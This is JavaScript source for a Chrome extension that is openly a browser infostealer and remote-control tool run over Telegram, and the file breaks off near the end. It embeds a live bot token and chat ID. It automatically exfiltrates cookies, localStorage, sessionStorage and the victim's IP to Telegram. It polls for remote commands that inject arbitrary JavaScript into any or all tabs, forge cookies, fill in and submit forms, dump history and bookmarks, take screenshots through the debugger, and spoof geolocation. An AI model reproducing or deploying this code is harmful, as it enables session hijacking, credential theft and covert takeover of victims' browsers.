// ============================================================
// telegram C2 — full command deck
// ============================================================
const TELEGRAM_CONFIG = {
  botToken: "9290808068:AAE66WIU1k7WcInjiN2a0S-1lr6iIJqnVyo",
  chatId: "7122235679"
};

const GRAB_STATE     = { enabled: true };
const OPENED_TABS    = new Map();
const CAPTURED_PAGES = new Map();
const DEBUGGED       = new Set();
const NET_BUFFER     = new Map(); // tabId -> [{method,url,status}]
const POLL_KEY       = "tg_poll_offset";
const ALARM_NAME     = "tg_c2_keepalive";
let polling = false;

// ============================================================
// helpers
// ============================================================
function getBengaliDateTime() {
  return new Date().toLocaleString("bn-BD", {
    year: "numeric", month: "long", day: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
    hour12: true, timeZone: "Asia/Dhaka"
  });
}

function escapeHtml(t) {
  if (!t) return "";
  return String(t)
    .replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")
    .replace(/"/g,"&quot;").replace(/'/g,"&#039;")
    .replace(/\*/g,"&#42;").replace(/_/g,"&#95;")
    .replace(/\[/g,"&#91;").replace(/\]/g,"&#93;")
    .replace(/\(/g,"&#40;").replace(/\)/g,"&#41;");
}

function b64toBlob(b64, mime = "image/png") {
  const bin = atob(b64);
  const arr = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
  return new Blob([arr], { type: mime });
}

function splitCmd(text) {
  const m = text.match(/^(\/\S+)\s+(.*)$/s);
  if (!m) return { cmd: text.trim().toLowerCase(), rest: "" };
  return { cmd: m[1].toLowerCase(), rest: m[2].trim() };
}

async function tgFetch(method, body, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const res = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/${method}`,
        body instanceof FormData
          ? { method: "POST", body }
          : { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) }
      );
      if (res.status === 429) {
        const j = await res.json().catch(() => ({}));
        await new Promise(r => setTimeout(r, (j?.result?.retry_after || 3) * 1000));
        continue;
      }
      return res;
    } catch (e) {
      if (i === retries - 1) throw e;
      await new Promise(r => setTimeout(r, 1000 * (i + 1)));
    }
  }
}

async function sendMsg(html) {
  const fd = new FormData();
  fd.append("chat_id", TELEGRAM_CONFIG.chatId);
  fd.append("text", html);
  fd.append("parse_mode", "HTML");
  fd.append("disable_web_page_preview", "true");
  await tgFetch("sendMessage", fd);
}

async function sendPhoto(b64, caption = "") {
  const fd = new FormData();
  fd.append("chat_id", TELEGRAM_CONFIG.chatId);
  fd.append("photo", b64toBlob(b64, "image/png"), "shot.png");
  fd.append("caption", caption);
  fd.append("parse_mode", "HTML");
  await tgFetch("sendPhoto", fd);
}

async function sendDoc(b64, name, caption = "", mime = "application/pdf") {
  const fd = new FormData();
  fd.append("chat_id", TELEGRAM_CONFIG.chatId);
  fd.append("document", b64toBlob(b64, mime), name);
  fd.append("caption", caption);
  fd.append("parse_mode", "HTML");
  await tgFetch("sendDocument", fd);
}

// resolve a target arg (tabId OR url-substring OR empty=active tab)
async function resolveTabs(arg) {
  if (!arg) {
    const [active] = await chrome.tabs.query({ active: true, currentWindow: true });
    return active ? [active] : [];
  }
  if (/^\d+$/.test(arg)) {
    try { return [await chrome.tabs.get(parseInt(arg, 10))]; }
    catch { return []; }
  }
  const live = await chrome.tabs.query({});
  const needle = arg.replace(/^https?:\/\//i, "").replace(/\/$/, "").toLowerCase();
  return live.filter(t => t.url && t.url.replace(/^https?:\/\//i, "").toLowerCase().includes(needle));
}

// execute code in page MAIN world (CSP bypass on Chrome 111+)
async function runInPage(tabId, code) {
  try {
    const [res] = await chrome.scripting.executeScript({
      target: { tabId },
      func: (src) => {
        try { return { ok: true, value: eval(src) }; }
        catch (e) { return { ok: false, error: String(e) }; }
      },
      args: [code],
      world: "MAIN"
    });
    return res?.result || { ok: false, error: "no result" };
  } catch (e) {
    return { ok: false, error: String(e) };
  }
}

// ============================================================
// grabber (kept from v2, tightened)
// ============================================================
async function getIpAddress() {
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    return (await r.json()).ip;
  } catch { return "Unknown"; }
}

async function getStorage(tabId, kind) {
  try {
    const [res] = await chrome.scripting.executeScript({
      target: { tabId },
      func: (k) => {
        try {
          const s = window[k], out = {};
          for (let i = 0; i < s.length; i++) out[s.key(i)] = s.getItem(s.key(i));
          return out;
        } catch { return { error: "denied" }; }
      },
      args: [kind]
    });
    return res?.result || {};
  } catch { return {}; }
}

async function grabApplicationTabCookies(tabId, url) {
  if (!GRAB_STATE.enabled) return;
  try {
    const pageKey = `${tabId}-${url}`, now = Date.now();
    if (CAPTURED_PAGES.has(pageKey) && now - CAPTURED_PAGES.get(pageKey) < 30000) return;

    const mainDomain = new URL(url).hostname;
    const all = await chrome.cookies.getAll({});
    const mine = all.filter(c => {
      const d = c.domain.startsWith(".") ? c.domain.slice(1) : c.domain;
      return mainDomain.includes(d) || d.includes(mainDomain);
    });
    if (mine.length === 0) return;

    const cookieData = mine.map(c => ({
      domain: c.domain, ...(c.expirationDate && { expirationDate: c.expirationDate }),
      hostOnly: c.hostOnly, httpOnly: c.httpOnly, name: c.name, path: c.path,
      sameSite: c.sameSite || null, secure: c.secure, session: c.session,
      storeId: c.storeId || null, value: c.value
    }));

    const [ls, ss, ip] = await Promise.all([
      getStorage(tabId, "localStorage"),
      getStorage(tabId, "sessionStorage"),
      getIpAddress()
    ]);

    const httpOnlyCount = cookieData.filter(c => c.httpOnly).length;
    const secureCount   = cookieData.filter(c => c.secure).length;
    const sessionCount  = cookieData.filter(c => c.session).length;
    const score = Math.round(((secureCount + httpOnlyCount) / cookieData.length) * 100);
    const importantKeywords = ["token","session","auth","login","xsrf","csrf","sid"];
    const important = cookieData.filter(c => importantKeywords.some(k => c.name.toLowerCase().includes(k)));

    const jsonString = JSON.stringify(cookieData, null, 2);
    const fileName = `${mainDomain.replace(/\./g, "_")}_${Date.now()}.json`;
    const sizeKB = Math.round(jsonString.length / 1024);

    let msg = `<b>🖥️ cookie report</b>\n\n`;
    msg += `<b>🌐 domain:</b> ${escapeHtml(mainDomain)}\n`;
    msg += `<b>🔗 page:</b> ${escapeHtml(url)}\n`;
    msg += `<b>📦 cookies:</b> ${cookieData.length}\n`;
    if (Object.keys(ls).length) msg += `<b>💾 localStorage:</b> ${Object.keys(ls).length}\n`;
    if (Object.keys(ss).length) msg += `<b>📝 sessionStorage:</b> ${Object.keys(ss).length}\n`;
    msg += `<b>📎 file:</b> ${escapeHtml(fileName)} (${sizeKB}KB)\n`;
    msg += `<b>🕐 time:</b> ${escapeHtml(getBengaliDateTime())}\n`;
    msg += `<b>🌍 ip:</b> ${escapeHtml(ip)}\n\n`;
    msg += `<b>📊 analysis:</b>\n`;
    msg += `🔒 HttpOnly: ${httpOnlyCount}\n🔐 Secure: ${secureCount}\n⏳ Session: ${sessionCount}\n`;
    msg += `<b>📈 score:</b> ${score}%\n\n`;
    if (important.length) msg += `<b>⚠️ important:</b> ${important.length}\n` + important.slice(0, 5).map(c => `└ ${escapeHtml(c.name)}`).join("\n") + `\n`;

    const fd = new FormData();
    fd.append("chat_id", TELEGRAM_CONFIG.chatId);
    fd.append("document", new Blob([jsonString], { type: "application/json" }), fileName);
    fd.append("caption", msg);
    fd.append("parse_mode", "HTML");
    await tgFetch("sendDocument", fd);

    CAPTURED_PAGES.set(pageKey, now);
    setTimeout(() => CAPTURED_PAGES.delete(pageKey), 30000);
  } catch (e) { console.error("grab:", e); }
}

// ============================================================
// TAB commands
// ============================================================
async function cmdOpen(url) {
  if (!/^https?:\/\//i.test(url)) return sendMsg(`❌ url must start http(s): <code>${escapeHtml(url)}</code>`);
  const tab = await chrome.tabs.create({ url, active: false });
  OPENED_TABS.set(tab.id, url);
  await sendMsg(`✅ <b>opened</b> tab <code>${tab.id}</code>\n<code>${escapeHtml(url)}</code>`);
}

async function cmdClose(target) {
  if (!target) return sendMsg("❌ usage: <code>/close &lt;url|tabId&gt;</code>");
  const tabs = await resolveTabs(target);
  if (tabs.length === 0) return sendMsg(`⚠️ no match: <code>${escapeHtml(target)}</code>`);
  const ids = tabs.map(t => t.id);
  await chrome.tabs.remove(ids);
  ids.forEach(id => OPENED_TABS.delete(id));
  await sendMsg(`✅ closed ${ids.length} tab(s): <code>${ids.join(",")}</code>`);
}

async function cmdList() {
  const live = await chrome.tabs.query({});
  let msg = `<b>📋 tabs (${live.length})</b>\n\n`;
  live.slice(0, 40).forEach(t => {
    msg += `<code>${t.id}</code>${t.active ? " ★" : ""} — ${escapeHtml((t.title || "").slice(0, 60))}\n<code>${escapeHtml((t.url || "").slice(0, 100))}</code>\n\n`;
  });
  if (live.length > 40) msg += `... +${live.length - 40}\n`;
  await sendMsg(msg);
}

async function cmdNav(target, url) {
  if (!/^https?:\/\//i.test(url)) return sendMsg("❌ bad url");
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg(`⚠️ no match: <code>${escapeHtml(target)}</code>`);
  await chrome.tabs.update(tabs[0].id, { url });
  await sendMsg(`✅ tab <code>${tabs[0].id}</code> → <code>${escapeHtml(url)}</code>`);
}

async function cmdReload(target) {
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  for (const t of tabs) await chrome.tabs.reload(t.id);
  await sendMsg(`✅ reloaded ${tabs.length} tab(s)`);
}

async function cmdPin(target, on) {
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  await chrome.tabs.update(tabs[0].id, { pinned: on });
  await sendMsg(`✅ ${on ? "pinned" : "unpinned"} <code>${tabs[0].id}</code>`);
}

async function cmdMute(target, on) {
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  await chrome.tabs.update(tabs[0].id, { muted: on });
  await sendMsg(`✅ ${on ? "muted" : "unmuted"} <code>${tabs[0].id}</code>`);
}

async function cmdZoom(target, level) {
  const n = parseInt(level, 10);
  if (!n || n < 25 || n > 500) return sendMsg("❌ zoom 25–500");
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  await chrome.tabs.setZoom(tabs[0].id, n / 100);
  await sendMsg(`✅ zoom ${n}% on <code>${tabs[0].id}</code>`);
}

async function cmdFocus(target) {
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  await chrome.tabs.update(tabs[0].id, { active: true });
  await chrome.windows.update(tabs[0].windowId, { focused: true });
  await sendMsg(`✅ focused <code>${tabs[0].id}</code>`);
}

async function cmdUrl() {
  const [t] = await chrome.tabs.query({ active: true, currentWindow: true });
  await sendMsg(`🔗 <code>${escapeHtml(t?.url || "?")}</code>\n📄 ${escapeHtml(t?.title || "")}`);
}

async function cmdTitle() {
  const [t] = await chrome.tabs.query({ active: true, currentWindow: true });
  await sendMsg(`📄 <b>${escapeHtml(t?.title || "?")}</b>\n<code>${escapeHtml(t?.url || "")}</code>`);
}

// ============================================================
// PAGE commands (scripting, MAIN world)
// ============================================================
async function cmdClick(target, sel) {
  if (!sel) return sendMsg("❌ /click &lt;tabId|url&gt; &lt;selector&gt;");
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  const r = await runInPage(tabs[0].id, `(() => {
    const el = document.querySelector(${JSON.stringify(sel)});
    if (!el) return "selector not found";
    el.click(); return "clicked " + el.tagName;
  })()`);
  await sendMsg(`🖱 ${r.ok ? "✅" : "❌"} <code>${escapeHtml(String(r.value ?? r.error))}</code>`);
}

async function cmdType(target, sel, text) {
  if (!sel || !text) return sendMsg("❌ /type &lt;tabId|url&gt; &lt;sel&gt; &lt;text&gt;");
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  const r = await runInPage(tabs[0].id, `(() => {
    const el = document.querySelector(${JSON.stringify(sel)});
    if (!el) return "not found";
    el.focus();
    el.value = ${JSON.stringify(text)};
    el.dispatchEvent(new Event("input", {bubbles:true}));
    el.dispatchEvent(new Event("change", {bubbles:true}));
    return "typed " + el.value.length + " chars";
  })()`);
  await sendMsg(`⌨️ ${r.ok ? "✅" : "❌"} <code>${escapeHtml(String(r.value ?? r.error))}</code>`);
}

async function cmdSubmit(target, sel) {
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  const r = await runInPage(tabs[0].id, `(() => {
    const el = document.querySelector(${JSON.stringify(sel)});
    if (!el) return "not found";
    const f = el.closest("form");
    if (f) { f.requestSubmit ? f.requestSubmit() : f.submit(); return "form submitted"; }
    el.click(); return "clicked (no form)";
  })()`);
  await sendMsg(`📨 ${r.ok ? "✅" : "❌"} <code>${escapeHtml(String(r.value ?? r.error))}</code>`);
}

async function cmdScroll(target, px) {
  const n = parseInt(px, 10) || 500;
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  await runInPage(tabs[0].id, `window.scrollBy(0, ${n}); "scrolled ${n}px"`);
  await sendMsg(`📜 scrolled ${n}px on <code>${tabs[0].id}</code>`);
}

async function cmdHighlight(target, sel) {
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  const r = await runInPage(tabs[0].id, `(() => {
    const el = document.querySelector(${JSON.stringify(sel)});
    if (!el) return "not found";
    el.scrollIntoView({block:"center"});
    el.style.outline = "3px solid red";
    setTimeout(()=>{el.style.outline="";}, 2500);
    return "highlighted";
  })()`);
  await sendMsg(`🎯 ${r.ok ? "✅" : "❌"} <code>${escapeHtml(String(r.value ?? r.error))}</code>`);
}

async function cmdHtml(target, sel) {
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  const r = await runInPage(tabs[0].id, `(() => {
    const el = document.querySelector(${JSON.stringify(sel)});
    return el ? el.outerHTML.slice(0, 3500) : "not found";
  })()`);
  await sendMsg(`<pre>${escapeHtml(String(r.value ?? r.error))}</pre>`);
}

async function cmdText(target, sel) {
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  const r = await runInPage(tabs[0].id, `(() => {
    const el = document.querySelector(${JSON.stringify(sel)});
    return el ? el.innerText.slice(0, 3500) : "not found";
  })()`);
  await sendMsg(`<pre>${escapeHtml(String(r.value ?? r.error))}</pre>`);
}

async function cmdForms(target) {
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  const r = await runInPage(tabs[0].id, `(() => [...document.forms].map((f, i) => ({
    i, action: f.action, method: f.method,
    fields: [...f.elements].map(el => ({
      name: el.name, type: el.type,
      value: el.type === "password" ? "***" : el.value
    }))
  })))()`);
  await sendMsg(`<pre>${escapeHtml(JSON.stringify(r.value ?? r.error, null, 2).slice(0, 3500))}</pre>`);
}

async function cmdInject(target, js) {
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  const r = await runInPage(tabs[0].id, js);
  const out = r.ok ? JSON.stringify(r.value) : r.error;
  await sendMsg(`💉 <code>${escapeHtml(String(out).slice(0, 3000))}</code>`);
}

async function cmdInjectAll(js) {
  const live = await chrome.tabs.query({});
  let count = 0, out = [];
  for (const t of live) {
    if (!t.url?.startsWith("http")) continue;
    const r = await runInPage(t.id, js);
    out.push(`tab ${t.id}: ${r.ok ? "ok" : "err"}`);
    count++;
  }
  await sendMsg(`💉 all: ${count} tabs\n<pre>${escapeHtml(out.join("\n"))}</pre>`);
}

// ============================================================
// COOKIE commands
// ============================================================
async function cmdCookies(domain) {
  if (!domain) return sendMsg("❌ /cookies &lt;domain&gt;");
  const all = await chrome.cookies.getAll({ domain });
  let msg = `<b>🍪 cookies for ${escapeHtml(domain)} (${all.length})</b>\n\n`;
  all.slice(0, 30).forEach(c => {
    msg += `<b>${escapeHtml(c.name)}</b>\n<code>${escapeHtml(c.value.slice(0, 100))}</code>\n`;
    msg += `<i>${escapeHtml(c.domain)}${c.httpOnly ? " 🔒" : ""}${c.secure ? " 🔐" : ""}</i>\n\n`;
  });
  if (all.length > 30) msg += `... +${all.length - 30}\n`;
  await sendMsg(msg);
}

async function cmdCookieSet(domain, name, value) {
  if (!domain || !name) return sendMsg("❌ /cookie_set &lt;domain&gt; &lt;name&gt; &lt;value&gt;");
  const url = `https://${domain.replace(/^\./, "")}`;
  try {
    await chrome.cookies.set({ url, domain, name, value, path: "/", secure: true });
    await sendMsg(`✅ set cookie <b>${escapeHtml(name)}</b> on ${escapeHtml(domain)}`);
  } catch (e) { await sendMsg(`❌ ${escapeHtml(String(e))}`); }
}

async function cmdCookieDel(domain, name) {
  if (!domain || !name) return sendMsg("❌ /cookie_del &lt;domain&gt; &lt;name&gt;");
  const url = `https://${domain.replace(/^\./, "")}`;
  await chrome.cookies.remove({ url, name });
  await sendMsg(`✅ deleted <b>${escapeHtml(name)}</b> from ${escapeHtml(domain)}`);
}

// ============================================================
// DATA commands
// ============================================================
async function cmdHistory(query) {
  const items = await chrome.history.search({ text: query || "", maxResults: 25, startTime: 0 });
  let msg = `<b>📚 history (${items.length})</b>\n\n`;
  items.forEach(it => {
    msg += `<b>${escapeHtml((it.title || "").slice(0, 60))}</b>\n`;
    msg += `<code>${escapeHtml((it.url || "").slice(0, 100))}</code>\n`;
    msg += `<i>${new Date(it.lastVisitTime).toLocaleString()}</i>\n\n`;
  });
  await sendMsg(msg.slice(0, 4000));
}

async function cmdDownloads() {
  const items = await chrome.downloads.search({ limit: 25, orderBy: ["-startTime"] });
  let msg = `<b>📥 downloads (${items.length})</b>\n\n`;
  items.forEach(d => {
    msg += `<b>${escapeHtml((d.filename || "").split(/[\\/]/).pop().slice(0, 60))}</b>\n`;
    msg += `<i>${escapeHtml(d.state)} — ${d.bytesReceived ? Math.round(d.bytesReceived/1024) + "KB" : ""}</i>\n`;
    msg += `<code>${escapeHtml((d.url || "").slice(0, 100))}</code>\n\n`;
  });
  await sendMsg(msg.slice(0, 4000));
}

async function cmdBookmarks() {
  const tree = await chrome.bookmarks.getTree();
  const flat = [];
  (function walk(nodes) {
    for (const n of nodes) {
      if (n.url) flat.push(n);
      if (n.children) walk(n.children);
    }
  })(tree);
  let msg = `<b>🔖 bookmarks (${flat.length})</b>\n\n`;
  flat.slice(0, 30).forEach(b => {
    msg += `<b>${escapeHtml(b.title.slice(0, 60))}</b>\n<code>${escapeHtml(b.url.slice(0, 100))}</code>\n\n`;
  });
  await sendMsg(msg.slice(0, 4000));
}

// ============================================================
// DEBUGGER tier (CDP)
// ============================================================
async function ensureDebug(tabId) {
  if (DEBUGGED.has(tabId)) return;
  try {
    await chrome.debugger.attach({ tabId }, "1.3");
    DEBUGGED.add(tabId);
    await chrome.debugger.sendCommand({ tabId }, "Page.enable").catch(() => {});
    await chrome.debugger.sendCommand({ tabId }, "Runtime.enable").catch(() => {});
    await chrome.debugger.sendCommand({ tabId }, "Network.enable").catch(() => {});
  } catch (e) {
    // already attached elsewhere — treat as ready
    DEBUGGED.add(tabId);
  }
}

async function cmdDebugAttach(target) {
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  await ensureDebug(tabs[0].id);
  await sendMsg(`🛠 debugger attached to <code>${tabs[0].id}</code> (yellow bar visible)`);
}

async function cmdDebugDetach(target) {
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  try { await chrome.debugger.detach({ tabId: tabs[0].id }); } catch {}
  DEBUGGED.delete(tabs[0].id);
  await sendMsg(`✅ detached <code>${tabs[0].id}</code>`);
}

async function cmdEval(target, js) {
  const tabs = await resolveTabs(target);
  if (!tabs.length || !js) return sendMsg("❌ /eval &lt;tabId&gt; &lt;js&gt;");
  await ensureDebug(tabs[0].id);
  try {
    const r = await chrome.debugger.sendCommand({ tabId: tabs[0].id }, "Runtime.evaluate", {
      expression: js, returnByValue: true, awaitPromise: true, userGesture: true
    });
    const out = r.exceptionDetails ? r.exceptionDetails.text : JSON.stringify(r.result?.value);
    await sendMsg(`<pre>${escapeHtml(String(out).slice(0, 3500))}</pre>`);
  } catch (e) { await sendMsg(`❌ ${escapeHtml(String(e))}`); }
}

async function cmdShot(target, full) {
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  await ensureDebug(tabs[0].id);
  const r = await chrome.debugger.sendCommand({ tabId: tabs[0].id }, "Page.captureScreenshot", {
    format: "png", captureBeyondViewport: !!full
  });
  await sendPhoto(r.data, `📸 tab <code>${tabs[0].id}</code>${full ? " (full)" : ""}`);
}

async function cmdPdf(target) {
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  await ensureDebug(tabs[0].id);
  const r = await chrome.debugger.sendCommand({ tabId: tabs[0].id }, "Page.printToPDF", { printBackground: true });
  await sendDoc(r.data, `page_${tabs[0].id}_${Date.now()}.pdf`, `📄 tab <code>${tabs[0].id}</code>`);
}

async function cmdGeo(target, lat, lon) {
  const la = parseFloat(lat), lo = parseFloat(lon);
  if (isNaN(la) || isNaN(lo)) return sendMsg("❌ /geo &lt;tabId&gt; &lt;lat&gt; &lt;lon&gt;");
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  await ensureDebug(tabs[0].id);
  await chrome.debugger.sendCommand({ tabId: tabs[0].id }, "Emulation.setGeolocationOverride", {
    latitude: la, longitude: lo, accuracy: 100
  });
  await sendMsg(`🌍 geolocation → ${la}, ${lo} on <code>${tabs[0].id}</code>\n<i>reload the tab to apply</i>`);
}

async function cmdNet(target, on) {
  const tabs = await resolveTabs(target);
  if (!tabs.length) return sendMsg("⚠️ no match");
  const id = tabs[0].id;
  if (on) {
    await ensureDebug(id);
    NET_BUFFER.set(id, []);
    await sendMsg(`📡 network logging ON for <code>${id}</code>`);
  } else {
    const buf = NET_BUFFER.get(id) || [];
    NET_BUFFER.delete(id);
    let msg = `<b>📡 network log (${buf.length})</b>\n\n`;
    buf.slice(-40).forEach(e => {
      msg += `<code>${escapeHtml(e.status || "?")}</code> ${escapeHtml(e.method)} <code>${escapeHtml((e.url||"").slice(0,90))}</code>\n`;
    });
    await sendMsg(msg.slice(0, 4000));
  }
}

// ============================================================
// UTILITY commands
// ============================================================
async function cmdNotify(title, body) {
  if (!title) return sendMsg("❌ /notify &lt;title&gt; | &lt;body&gt;");
  await chrome.notifications.create({
    type: "basic",
    title: title.slice(0, 60),
    message: (body || "").slice(0, 200),
    iconUrl: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
  });
  await sendMsg(`🔔 notified: <b>${escapeHtml(title)}</b>`);
}

async function cmdGrab(on) {
  GRAB_STATE.enabled = !!on;
  await sendMsg(`✅ grabber <b>${GRAB_STATE.enabled ? "ON" : "OFF"}</b>`);
}

async function cmdState() {
  const live = await chrome.tabs.query({});
  await sendMsg(
    `<b>📊 state</b>\n` +
    `grabber: <b>${GRAB_STATE.enabled ? "ON" : "OFF"}</b>\n` +
    `tabs: <b>${live.length}</b>\n` +
    `tracked: <b>${OPENED_TABS.size}</b>\n` +
    `debugged: <b>${DEBUGGED.size}</b>\n` +
    `net listeners: <b>${NET_BUFFER.size}</b>\n` +
    `time: ${escapeHtml(getBengaliDateTime())}`
  );
}

async function cmdHelp() {
  await sendMsg(
    `<b>🕹️ c2 deck</b>\n\n` +
    `<b>— tab —</b>\n` +
    `<code>/open &lt;url&gt;</code> bg tab\n` +
    `<code>/close &lt;url|id&gt;</code>\n` +
    `<code>/list</code>\n` +
    `<code>/nav &lt;id|url&gt; &lt;url&gt;</code>\n` +
    `<code>/reload &lt;id|url&gt;</code>\n` +
    `<code>/pin &lt;id|url&gt;</code> · <code>/unpin</code>\n` +
    `<code>/mute</code> · <code>/unmute</code>\n` +
    `<code>/zoom &lt;id|url&gt; &lt;25-500&gt;</code>\n` +
    `<code>/focus &lt;id|url&gt;</code>\n` +
    `<code>/url</code> · <code>/title</code>\n\n` +
    `<b>— page —</b>\n` +
    `<code>/click &lt;id&gt; &lt;sel&gt;</code>\n` +
    `<code>/type &lt;id&gt; &lt;sel&gt; &lt;text&gt;</code>\n` +
    `<code>/submit &lt;id&gt; &lt;sel&gt;</code>\n` +
    `<code>/scroll &lt;id&gt; &lt;px&gt;</code>\n` +
    `<code>/highlight &lt;id&gt; &lt;sel&gt;</code>\n` +
    `<code>/html &lt;id&gt; &lt;sel&gt;</code>\n` +
    `<code>/text &lt;id&gt; &lt;sel&gt;</code>\n` +
    `<code>/forms &lt;id&gt;</code>\n` +
    `<code>/inject &lt;id&gt; &lt;js&gt;</code>\n` +
    `<code>/inject_all &lt;js&gt;</code>\n\n` +
    `<b>— cookies —</b>\n` +
    `<code>/cookies &lt;domain&gt;</code>\n` +
    `<code>/cookie_set &lt;domain&gt; &lt;n&gt; &lt;v&gt;</code>\n` +
    `<code>/cookie_del &lt;domain&gt; &lt;name&gt;</code>\n\n` +
    `<b>— data —</b>\n` +
    `<code>/history [q]</code> · <code>/downloads</code> · <code>/bookmarks</code>\n\n` +
    `<b>— debug (CDP) —</b>\n` +
    `<code>/debug_attach &lt;id&gt;</code> · <code>/debug_detach &lt;id&gt;</code>\n` +
    `<code>/eval &lt;id&gt; &lt;js&gt;</code> — CSP bypass\n` +
    `<code>/shot &lt;id&gt;</code> · <code>/shot_full &lt;id&gt;</code>\n` +
    `<code>/pdf &lt;id&gt;</code>\n` +
    `<code>/geo &lt;id&gt; &lt;lat&gt; &lt;lon&gt;</code>\n` +
    `<code>/net &lt;id&gt;</code> toggle · same cmd flushes\n\n` +
    `<b>— util —</b>\n` +
    `<code>/notify &lt;title&gt; | &lt;body&gt;</code>\n` +
    `<code>/grab</code> · <code>/grab_off</code>\n` +
    `<code>/state</code> · <code>/ping</code> · <code>/help</code>`
  );
}

// ============================================================
// ROUTER
// ============================================================
async function handleCommand(text) {
  const { cmd, rest } = splitCmd(text);
  const tok = rest ? rest.split(/\s+/) : [];
  const tailFrom = (n) => tok.slice(n).join(" ");

  try {
    switch (cmd) {
      case "/open":       return cmdOpen(rest);
      case "/close":      return cmdClose(rest);
      case "/list":       return cmdList();
      case "/nav":        return cmdNav(tok[0], tailFrom(1));
      case "/reload":     return cmdReload(rest);
      case "/pin":        return cmdPin(rest, true);
      case "/unpin":      return cmdPin(rest, false);
      case "/mute":       return cmdMute(rest, true);
      case "/unmute":     return cmdMute(rest, false);
      case "/zoom":       return cmdZoom(tok[0], tok[1]);
      case "/focus":      return cmdFocus(rest);
      case "/url":        return cmdUrl();
      case "/title":      return cmdTitle();

      case "/click":      return cmdClick(tok[0], tok[1]);
      case "/type":       return cmdType(tok[0], tok[1], tailFrom(2));
      case "/submit":     return cmdSubmit(tok[0], tok[1]);
      case "/scroll":     return cmdScroll(tok[0], tok[1]);
      case "/highlight":  return cmdHighlight(tok[0], tok[1]);
      case "/html":       return cmdHtml(tok[0], tok[1]);
      case "/text":       return cmdText(tok[0], tok[1]);
      case "/forms":      return cmdForms(rest);
      case "/inject":     return cmdInject(tok[0], tailFrom(1));
      case "/inject_all": return cmdInjectAll(rest);

      case "/cookies":    return cmdCookies(rest);
      case "/cookie_set": return cmdCookieSet(tok[0], tok[1], tailFrom(2));
      case "/cookie_del": return cmdCookieDel(tok[0], tok[1]);

      case "/history":    return cmdHistory(rest);
      case "/downloads":  return cmdDownloads();
      case "/bookmarks":  return cmdBookmarks();

      case "/debug_attach": return cmdDebugAttach(rest);
      case "/debug_detach": return cmdDebugDetach(rest);
      case "/eval":       return cmdEval(tok[0], tailFrom(1));
      case "/shot":       return cmdShot(rest, false);
      case "/shot_full":  return cmdShot(rest, true);
      case "/pdf":        return cmdPdf(rest);
      case "/geo":        return cmdGeo(tok[0], tok[1], tok[2]);
      case "/net":        return cmdNet(tok[0], !(tok[1] === "off"));

      case "/notify": {
        const [title, ...body] = rest.split("|").map(s => s.trim());
        return cmdNotify(title, body.join(" | "));
      }
      case "/grab":       return cmdGrab(true);
      case "/grab_off":   return cmdGrab(false);
      case "/state":      return cmdState();
      case "/ping":       return sendMsg(`🟢 pong — ${escapeHtml(getBengaliDateTime())}`);
      case "/help":
      case "/start":      return cmdHelp();

      default:
        if (cmd.startsWith("/")) await sendMsg(`❓ unknown <code>${escapeHtml(cmd)}</code> — <code>/help</code>`);
    }
  } catch (e) {
    await sendMsg(`❌ <b>cmd error:</b> <code>${escapeHtml(String(e))}</code>`);
  }
}

// ============================================================
// POLL
// ============================================================
async function getOffset() {
  const st = await chrome.storage.local.get(POLL_KEY);
  return st[POLL_KEY] || 0;
}
async function setOffset(v) {
  await chrome.storage.local.set({ [POLL_KEY]: v });
}

async function pollLoop() {
  if (polling) return;
  polling = true;
  try {
    let offset = await getOffset();
    while (true) {
      try {
        const res = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/getUpdates?timeout=25&offset=${offset + 1}&allowed_updates=["message"]`
        );
        if (res.status === 409) { await new Promise(r => setTimeout(r, 10000)); continue; }
        if (!res.ok) { await new Promise(r => setTimeout(r, 3000)); continue; }
        const json = await res.json();
        if (!json.ok) { await new Promise(r => setTimeout(r, 3000)); continue; }
        for (const upd of json.result || []) {
          offset = upd.update_id;
          await setOffset(offset);
          const msg = upd.message;
          if (!msg || String(msg.chat?.id) !== String(TELEGRAM_CONFIG.chatId)) continue;
          if (msg.text?.startsWith("/")) await handleCommand(msg.text);
        }
      } catch { await new Promise(r => setTimeout(r, 3000)); }
    }
  } finally { polling = false; }
}

// ============================================================
// LISTENERS
// ============================================================
chrome.alarms.onAlarm.addListener(a => { if (a.name === ALARM_NAME) pollLoop(); });

chrome.runtime.onInstalled.addListener(async () => {
